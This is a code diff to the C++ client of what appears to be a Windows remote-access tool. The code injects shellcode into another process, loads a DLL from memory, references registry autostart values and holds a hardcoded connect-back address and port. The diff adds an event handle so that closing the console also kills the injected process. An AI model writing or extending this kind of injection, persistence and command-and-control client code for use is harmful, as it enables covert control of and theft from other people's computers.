@@ -1,12 +1,9 @@
 
-#include <stdio.h>
-#include <iostream>
-#include <corecrt_io.h>
-#include "common/commands.h"
 #include "StdAfx.h"
 #include "MemoryModule.h"
 #include "ShellcodeInj.h"
 #include <WS2tcpip.h>
+#include <common/commands.h>
 #pragma comment(lib, "ws2_32.lib")
 
 // 自动启动注册表中的值
@@ -28,6 +25,8 @@ IsStoped bStop = NULL;
 IsExit bExit = NULL;
 
 BOOL status = 0;
+
+HANDLE hEvent = NULL;
 
 #ifdef _DEBUG
 CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", "6543", CLIENT_TYPE_DLL, false, DLL_VERSION, 0, Startup_InjSC };
@@ -94,6 +93,7 @@ BOOL CALLBACK callback(DWORD CtrlType)
 	if (CtrlType == CTRL_CLOSE_EVENT)
 	{
 		status = 1;
+		if (hEvent) SetEvent(hEvent);
 		if(stop) stop();
 		while(1==status)
 			Sleep(20);
@@ -282,20 +282,28 @@ int main(int argc, const char *argv[])
 		// If failed then run memory DLL
 		ShellcodeInj inj;
 		int pid = 0;
+		hEvent = ::CreateEventA(NULL, TRUE, FALSE, NULL);
 		do {
 			if (sizeof(void*) == 4) // Shell code is 64bit
 				break;
 			if (!(pid = inj.InjectProcess(nullptr))) {
 				break;
 			}
-			HANDLE hProcess = OpenProcess(SYNCHRONIZE, FALSE, pid);
+			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, pid);
 			if (hProcess == NULL) {
 				break;
 			}
 			Mprintf("Inject process [%d] succeed.\n", pid);
-			DWORD waitResult = WaitForSingleObject(hProcess, INFINITE);
+			HANDLE handles[2] = { hProcess, hEvent };
+			DWORD waitResult = WaitForMultipleObjects(2, handles, FALSE, INFINITE);
+			if (status == 1) {
+				TerminateProcess(hProcess, -1);
+				CloseHandle(hEvent);
+			}
 			CloseHandle(hProcess);
 			Mprintf("Process [%d] is finished.\n", pid);
+			if (status == 1)
+				return -1;
 		} while (pid);
 	}
 
